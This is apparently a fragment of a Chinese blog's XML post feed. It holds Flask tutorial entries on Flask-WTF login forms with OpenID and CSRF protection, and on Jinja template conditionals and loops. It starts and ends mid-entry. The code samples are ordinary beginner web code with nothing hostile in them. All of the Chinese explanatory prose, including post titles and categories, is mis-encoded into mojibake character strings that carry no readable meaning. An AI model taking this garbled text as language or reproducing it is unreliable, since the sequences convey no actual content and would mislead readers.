çš„ä¸œè¥¿è¿˜çœŸå­¦åˆ°äº†ä¸å°‘..</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flaskå­¦ä¹ (3)è¡¨å•</title>
      <link href="/2017/08/19/flask%E5%AD%A6%E4%B9%A03%E8%A1%A8%E5%8D%95/"/>
      <url>/2017/08/19/flask%E5%AD%A6%E4%B9%A03%E8%A1%A8%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h4 id="ä¸€é…ç½®">ä¸€:é…ç½®</h4><p>ä¸ºäº†å¤„ç†è¡¨å•æˆ‘ä»¬ä½¿ç”¨Flask-WTFæ’ä»¶,é‡Œé¢åŒ…å«ä¸€äº›è¡¨å•çš„åˆ›å»ºå’ŒéªŒè¯,csrfçš„ä¿æŠ¤.ä½†åœ¨è¿™ä¹‹å‰æˆ‘ä»¬è¦è¿›è¡Œä¸€æ³¢é…ç½®. æˆ‘ä»¬åœ¨microblogç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶(config.py)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CSRF_ENABLED = True</span><br><span class="line">SECRET_KEY = &#x27;you-will-never-guess&#x27;</span><br></pre></td></tr></table></figure><p>é…ç½®å¥½äº†ä¹‹å,æˆ‘ä»¬è¦è®©Flaskæ¥è¯»å–ä½¿ç”¨,æ‰€ä»¥æˆ‘ä»¬è¦åœ¨flaskåº”ç”¨ç¨‹åºè¢«åˆ›å»ºåå»appçš„<strong>init</strong>.pyé‡Œé¢è¿›è¡Œä¿®æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(<span class="string">&#x27;config&#x27;</span>)</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> views</span><br></pre></td></tr></table></figure><p>å…¶ä¸­app.config.from_objecté‡Œé¢çš„å‚æ•°æ˜¯åœ¨appçš„ä¸Šçº§ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶</p><h4 id="äºŒç”¨æˆ·ç™»å½•è¡¨å•">äºŒ:ç”¨æˆ·ç™»å½•è¡¨å•</h4><p>è¿™é‡Œä½¿ç”¨openidè¿›è¡Œç™»å½• ä»€ä¹ˆæ˜¯openidå‘¢?è¿™æ˜¯ä¸€ä¸ªç”¨äºèº«ä»½è®¤è¯çš„ä¸€ä¸ªä¸œè¥¿,å®ƒçš„åŸç†æ˜¯</p><ol type="1"><li><p>ä½ é¦–å…ˆå¾—æ‹¥æœ‰ä¸€ä¸ªåˆæ³•çš„OpenIDå¸å·ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦åœ¨ä¸€ä¸ªéªŒè¯æœåŠ¡å™¨ç”³è¯·äº†ä¸€ä¸ªå¸å·ã€‚</p></li><li><p>ä½ æœ‰äº†è¿™ä¸ªå¸å·ä¹‹åï¼Œå°±å¯ä»¥åœ¨ä»»ä½•ä¸€ä¸ªå…¶ä»–æ”¯æŒOpenIDéªŒè¯çš„ç½‘ç«™ï¼Œå¹¶ä¸”ç”¨ä½ ä¸Šé¢ç”³è¯·çš„OpenIDè¿›è¡Œç™»å½•</p></li><li><p>å› ä¸ºè¿™ä¸ªç½‘ç«™å¹¶ä¸çŸ¥é“ä½ çš„èº«ä»½æ˜¯å¦æ­£ç¡®ï¼Œæ‰€ä»¥å®ƒä¼šè¯·æ±‚ä½ çš„éªŒè¯æœåŠ¡å™¨å¯¹ä½ çš„èº«ä»½è¿›è¡ŒéªŒè¯ã€‚</p></li><li><p>éªŒè¯æœåŠ¡å™¨å‘Šè¯‰ç½‘ç«™è¯´ï¼Œä½ æ˜¯åˆæ³•ç”¨æˆ·</p></li><li><p>ç½‘ç«™æ¥å—ä½ çš„èº«ä»½ï¼Œè®©ä½ è¿›å…¥ã€‚</p></li></ol><p>ä¸‹é¢å¼€å§‹å†™ç¬¬ä¸€ä¸ªè¡¨å•æ–‡ä»¶(app/forms.py)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.ext.wtf <span class="keyword">import</span> Form</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, BooleanField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginForm</span>(<span class="title class_ inherited__">Form</span>):</span><br><span class="line">     openid = StringField(<span class="string">&#x27;openid&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">     remember_me = BooleanField(<span class="string">&#x27;remember_me&#x27;</span>, default=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå†™å®Œäº†LoginFormä¹‹å,åœ¨viewsé‡Œé¢å¯¼å…¥ä¸€ä¸‹,å®ä¾‹åŒ–ä¸€ä¸‹,ç„¶åä¼ ç»™æ¨¡ç‰ˆé‡Œé¢å°±å¯ä»¥ç›´æ¥ç”Ÿæˆè¡¨å•.</p><h4 id="ä¸‰è¡¨å•è§†å›¾">ä¸‰:è¡¨å•è§†å›¾</h4><p>ç›´æ¥åœ¨viewsé‡Œé¢æ”¹å°±å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,flash,redirect</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> .forms <span class="keyword">import</span> LoginForm</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = &#123;<span class="string">&#x27;nickname&#x27;</span>:<span class="string">&#x27;Miguel&#x27;</span>&#125;</span><br><span class="line">    posts = [&#123;<span class="string">&#x27;author&#x27;</span>:&#123;<span class="string">&quot;nickname&quot;</span>:<span class="string">&#x27;John&#x27;</span>&#125;,<span class="string">&#x27;body&#x27;</span>:<span class="string">&#x27;Beautiful day in Portland!&#x27;</span>&#125;,&#123;<span class="string">&#x27;author&#x27;</span>:&#123;<span class="string">&#x27;nickname&#x27;</span>:<span class="string">&#x27;Susan&#x27;</span>&#125;,<span class="string">&#x27;body&#x27;</span>:<span class="string">&#x27;The Avengers movie was so cool!&#x27;</span>&#125;]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,title = <span class="string">&quot;Home!&quot;</span>,user=user,posts=posts)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods = [<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        flash(<span class="string">&#x27;Login requested for OpenID=&quot;&#x27;</span> + form.openid.data+<span class="string">&#x27;&quot;,remember_me=&#x27;</span>+<span class="built_in">str</span>(form.remember_me.data))</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>,title=<span class="string">&#x27;Sign In&#x27;</span>,form=form,providers=app.config[<span class="string">&#x27;OPENID_PROVIDERS&#x27;</span>])</span><br></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿå°±æ˜¯å¯¼å…¥ä¸€ä¸ªLoginFormç„¶åå®ä¾‹åŒ–ä¼ å…¥æ¨¡ç‰ˆ è¿™é‡Œæ³¨æ„è·¯ç”±è£…é¥°å™¨çš„<strong>methods</strong>å‚æ•°,é‡Œé¢å†™["GET","POST"]å°±æ˜¯è¿™ä¸ªè§†å›¾æ¥å—getå’Œpostè¯·æ±‚ å¦‚æœä¸å¸¦çš„è¯æ˜¯é»˜è®¤æ¥å—getè¯·æ±‚ <strong>validate_on_submit</strong> åšäº†æ‰€æœ‰çš„è¡¨å•å¤„ç† åœ¨è¡¨å•å±•ç¤ºçš„æ—¶å€™å®ƒè¿”å›false åœ¨æäº¤è¯·æ±‚çš„æ—¶å€™å®ƒä¼šæ”¶é›†æ•°æ®ç„¶åéªŒè¯,å…¨éƒ¨é€šè¿‡çš„è¯è¿”å›trueå¦åˆ™è¿”å›false <strong>flash</strong> è¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯å¿«é€Ÿåœ°è¿”å›ç»™ç”¨æˆ·é¡µé¢ä¸Šçš„ä¸€ä¸ªæ¶ˆæ¯. è¿™ä¸ªå‡½æ•°åœ¨ç”Ÿäº§æœåŠ¡å™¨çš„æ—¶å€™å¯ä»¥ç”¨æ¥æä¾›åé¦ˆç»™ç”¨æˆ·æœ‰å…³çš„è¡ŒåŠ¨ å½“ç„¶è¿™ä¸ªå‡½æ•°è¦æ˜¯è¦è¿”å›ç»™ç”¨æˆ·çš„è¯å¿…é¡»è¦åœ¨æ¨¡ç‰ˆé‡Œé¢åŠ ä¸Šä¸€äº›ä¸œè¥¿ æ¯”å¦‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">  &#123;% if messages %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">flashes</span>&gt;</span></span><br><span class="line">    &#123;% for message in messages %&#125;</span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><p><strong>é”™è¯¯å¤„ç†</strong> å½“ç”¨æˆ·éªŒè¯å¤±è´¥çš„æ—¶å€™æˆ‘ä»¬å¸Œæœ›å¯ä»¥è¿”å›é”™è¯¯çš„ä¿¡æ¯,æ¯”å¦‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for error in form.openid.errors %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color: red;&quot;</span>&gt;</span>[&#123;&#123; error &#125;&#125;]<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å››æ”¹è¡¨å•æ¨¡ç‰ˆ">å››:æ”¹è¡¨å•æ¨¡ç‰ˆ</h4><p>æ¨¡ç‰ˆå…ˆç»§æ‰¿å‰é¢çš„base.html,ç„¶åæˆ‘ä»¬å†æ¥å—ä¼ å…¥çš„formå‚æ•°è¿›è¡Œå¸ƒå±€</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">set_openid</span>(<span class="params">openid,pr</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        u = openid.<span class="title function_">search</span>(<span class="string">&quot;&lt;username&gt;&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (u != -<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            user = <span class="title function_">prompt</span>(<span class="string">&#x27;Enter your&#x27;</span>+pr+<span class="string">&#x27; username:&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            openid = openid.<span class="title function_">substr</span>(<span class="number">0</span>,u)+user</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        form = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&#x27;login&#x27;</span>];</span></span><br><span class="line"><span class="language-javascript">        form.<span class="property">elements</span>[<span class="string">&#x27;openid&#x27;</span>].<span class="property">value</span> = openid</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Sign In<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;form.hidden_tag()&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        Please enter your OpenID:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        &#123;&#123;form.openid(size=80)&#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        &#123;% for error in form.openid.errors %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color:red;&quot;</span>&gt;</span>[&#123;&#123;error&#125;&#125;]<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &#123;% for pr in providers %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:set_openid(&#x27;&#123;&#123; pr.url &#125;&#125;&#x27;,&#x27;&#123;&#123; pr.name &#125;&#125;&#x27;);&quot;</span>&gt;</span>&#123;&#123; pr.name &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;form.remember_me&#125;&#125;Remember Me<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login In!&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„form.hidden_tag()ä¼šåœ¨æœåŠ¡å™¨çš„è¿”å›é¡µé¢åŠ ä¸€æ®µéšè—è¡¨å•ç”¨äºéªŒè¯csrf è¿˜æ¯”å¦‚åƒform.field_nameé‡Œé¢å¯ä»¥å¸¦å‚æ•°,æ¯”å¦‚è¿™é‡Œè¦æ±‚openidå®½åº¦ä¸º80</p><h4 id="äº”å¤„ç†openids">äº”:å¤„ç†openids</h4><p>é¦–å…ˆæˆ‘ä»¬å¾—å®šä¹‰ä¸€ä¸ªopenidsçš„åˆ—è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CSRF_ENABLED = True</span><br><span class="line">SECRET_KEY = &#x27;you-will-never-guess&#x27;</span><br><span class="line"></span><br><span class="line">OPENID_PROVIDERS = [</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;Google&#x27;, &#x27;url&#x27;: &#x27;https://www.google.com/accounts/o8/id&#x27; &#125;,</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;Yahoo&#x27;, &#x27;url&#x27;: &#x27;https://me.yahoo.com&#x27; &#125;,</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;AOL&#x27;, &#x27;url&#x27;: &#x27;http://openid.aol.com/&lt;username&gt;&#x27; &#125;,</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;Flickr&#x27;, &#x27;url&#x27;: &#x27;http://www.flickr.com/&lt;username&gt;&#x27; &#125;,</span><br><span class="line">    &#123; &#x27;name&#x27;: &#x27;MyOpenID&#x27;, &#x27;url&#x27;: &#x27;https://www.myopenid.com&#x27; &#125;]</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨è§†å›¾å‡½æ•°é‡Œé¢åœ¨åŠ ä¸Šä¸€ä¸ªproviders=app.config["OPENID_PROVIDERS"],ç„¶åæŒ‰ç…§ä¸Šé¢æ¨¡ç‰ˆé‡Œé¢å†™çš„æ¥å†™å°±okäº†.</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>flaskå­¦ä¹ (2)æ¨¡ç‰ˆ</title>
      <link href="/2017/08/16/flask%E5%AD%A6%E4%B9%A02%E6%A8%A1%E7%89%88/"/>
      <url>/2017/08/16/flask%E5%AD%A6%E4%B9%A02%E6%A8%A1%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>é¦–å…ˆå…ˆç¡®è®¤ä¸€ä¸‹æ–‡ä»¶ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">microblog\</span><br><span class="line">flask\</span><br><span class="line">   virtual environment files</span><br><span class="line">app\</span><br><span class="line">   static\</span><br><span class="line">   templates\</span><br><span class="line">   __init__.py</span><br><span class="line">   views.py</span><br><span class="line">tmp\</span><br><span class="line">run.py</span><br></pre></td></tr></table></figure><p>ç„¶åå¦‚æœæˆ‘ä»¬åœ¨å†™ç«™çš„æ—¶å€™ç›´æ¥å†™htmlçš„è¯å°±éœ€è¦å¤„ç†è½¬ä¹‰çš„é—®é¢˜,è€Œè¿™å°±æ¶‰åŠåˆ°ç¨‹åºçš„å®‰å…¨é—®é¢˜äº†,æ‰€ä»¥flaskå°±ç»™æˆ‘ä»¬é…ç½®å¥½äº†jinjaæ¨¡ç‰ˆ.</p><h5 id="ä¸€.æ¨¡ç‰ˆçš„ä½¿ç”¨">ä¸€.æ¨¡ç‰ˆçš„ä½¿ç”¨</h5><p>æ¨¡ç‰ˆå¯ä»¥å¸®æˆ‘ä»¬æŠŠç½‘é¡µçš„å¸ƒå±€å’Œé€»è¾‘åˆ†å¼€ ç„¶åæˆ‘ä»¬æŠŠåŠ¨æ€çš„å†…å®¹æ”¾åœ¨{{...}}é‡Œé¢å°±ok æ¯”å¦‚æˆ‘ä»¬å†™(app/templates/index.html)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    user = &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;Miguel&#x27;</span> &#125; <span class="comment"># fake user</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">    title = <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">    user = user)</span><br></pre></td></tr></table></figure><h5 id="äºŒ.æ¨¡ç‰ˆä¸­çš„æ¡ä»¶è¯­å¥">äºŒ.æ¨¡ç‰ˆä¸­çš„æ¡ä»¶è¯­å¥</h5><p>æ§åˆ¶è¯­å¥,æ¯”å¦‚æˆ‘ä»¬æ¨¡ç‰ˆé‡Œé¢å¯ä»¥è¿™ä¹ˆå†™</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&#123;% if title %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬åœ¨æ²¡æœ‰ä¼ titleçš„æ—¶å€™ä¼šè‡ªåŠ¨æŠŠé¢˜ç›®æ”¹æˆWelcome to microblog</p><h5 id="ä¸‰.æ¨¡ç‰ˆé‡Œçš„å¾ªç¯è¯­å¥">ä¸‰.æ¨¡ç‰ˆé‡Œçš„å¾ªç¯è¯­å¥</h5><p>æˆ‘ä»¬å…ˆåœ¨è§†å›¾æ–‡ä»¶é‡Œé¢å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">     user = &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;Miguel&#x27;</span> &#125; <span class="comment"># fake user</span></span><br><span class="line">     posts = [ <span class="comment"># fake array of posts</span></span><br><span class="line">     &#123;</span><br><span class="line">     <span class="string">&#x27;author&#x27;</span>: &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;John&#x27;</span> &#125;,</span><br><span class="line">     <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;Beautiful day in Portland!&#x27;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">     <span class="string">&#x27;author&#x27;</span>: &#123; <span class="string">&#x27;nickname&#x27;</span>: <span class="string">&#x27;Susan&#x27;</span> &#125;,</span><br><span class="line">     <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;The Avengers movie was so cool!&#x27;</span></span><br><span class="line">     &#125;</span><br><span class="line">     ]</span><br><span class="line">     <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">     title = <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">     user = user,</span><br><span class="line">     posts = posts)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å»templatesé‡Œé¢çš„index.htmlé‡Œé¢å»å†™</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&#123;% if title %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125; - microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>microblog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hi, &#123;&#123;user.nickname&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;post.author.nickname&#125;&#125; says: <span class="tag">&lt;<span class="name">b</span>&gt;</span>&#123;&#123;post.body&#125;&#125;<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 